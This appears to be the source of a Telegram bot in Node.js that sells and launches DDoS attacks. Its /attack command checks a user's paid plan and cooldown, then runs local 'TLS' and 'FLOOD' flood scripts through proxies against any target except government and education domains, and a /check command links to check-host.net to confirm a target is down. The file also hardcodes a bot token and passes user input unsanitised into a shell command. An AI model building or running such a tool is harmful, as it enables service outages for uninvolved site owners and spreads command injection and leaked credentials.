const TelegramBot = require('node-telegram-bot-api');
const exec = require('child_process').exec;
const fs = require('fs');

// Token bot Telegram
const token = '6662685094:AAG-I-k025sbGp5L1coK3BoWs9K38-IBGE0';

// Inisialisasi bot Telegram
const bot = new TelegramBot(token, { polling: true });

// Load file plan.json
const plans = JSON.parse(fs.readFileSync('plan.json'));

// Function to check if the target is blocked
const isBlocked = (target) => {
    const blockedDomains = ['.go.id', '.gov', '.edu'];
    return blockedDomains.some(domain => target.endsWith(domain));
};

// Object to store cooldowns for each chat
const cooldowns = {};

// Command handler
bot.onText(/\/attack (.+) (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const method = match[1].toUpperCase();
    const target = match[2];
    const time = parseInt(match[3]);

    // Check if target is blocked
    if (isBlocked(target)) {
        bot.sendMessage(chatId, 'Target domain is blocked.');
        return;
    }

    // Check if the attack script file exists
    let scriptFile;
    if (method === 'TLS') {
        scriptFile = 'tls.js';
    } else if (method === 'FLOOD') {
        scriptFile = 'flood.js';
    } else {
        bot.sendMessage(chatId, 'Invalid attack method.');
        return;
    }

    // Check if the plan allows the attack
    const userPlan = plans.find(plan => plan.id === chatId);
    if (!userPlan) {
        bot.sendMessage(chatId, 'You are not subscribed to any plan. Please set your plan using /plan command.');
        return;
    }

    if (time > userPlan.maxTime) {
        bot.sendMessage(chatId, `Maximum attack time exceeded. Max time allowed: ${userPlan.maxTime} seconds.`);
        return;
    }

    if (cooldowns[chatId] && Date.now() - cooldowns[chatId] < userPlan.cooldown * 1000) {
        bot.sendMessage(chatId, `You are on cooldown. Please wait ${userPlan.cooldown} seconds.`);
        return;
    }

    // Execute the attack script
    exec(`node ${scriptFile} ${target} ${time} 512 10 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(chatId, `Error: ${error.message}`);
            return;
        }
        if (stderr) {
            bot.sendMessage(chatId, `stderr: ${stderr}`);
            return;
        }
        bot.sendMessage(chatId, `Attack sent to: ${target}\nTime: ${time}`);
    });

    // Set cooldown
    cooldowns[chatId] = Date.now();
});

// Command to show help
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    const helpMessage = `
    Available commands:
    /help - Show this help message.
    /attack METHODS (url) (time) - Initiate a DDoS attack.
    /method - Show available attack methods.
    /check (url) - Check HTTP response code of a target.
    /plan - Check your subscription plan.
    `;
    bot.sendMessage(chatId, helpMessage);
});

// Command to show available attack methods
bot.onText(/\/method/, (msg) => {
    const chatId = msg.chat.id;
    const methods = ['TLS', 'FLOOD'];
    bot.sendMessage(chatId, `Available attack methods: ${methods.join(', ')}`);
});

// Command to check target
bot.onText(/\/check (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const target = match[1];
    // You can implement the logic to check the target using https://check-host.net/ API
    // Send message indicating the check is being performed
    bot.sendMessage(chatId, `Checking target: ${target}...`);

    // Generate the link to check the target on check-host.net
    const checkHostLink = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
    
    // Send the link as a clickable button
    bot.sendMessage(chatId, `Check the target here: ${checkHostLink}`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Check Now', url: checkHostLink }]
            ]
        }
    });
});

// Command to show user's subscription plan
bot.onText(/\/plan/, (msg) => {
    const chatId = msg.chat.id;
    const userPlan = plans.find(plan => plan.id === chatId);
    if (userPlan) {
        bot.sendMessage(chatId, `Your plan: ${userPlan.plan}\nMax time: ${userPlan.maxTime} seconds\nCooldown: ${userPlan.cooldown} seconds`);
    } else {
        bot.sendMessage(chatId, 'You are not subscribed to any plan. Please set your plan using /plan command.');
    }
});


// Start listening for commands
bot.on('message', (msg) => {
    // Anda bisa menambahkan logika tambahan di sini jika diperlukan
});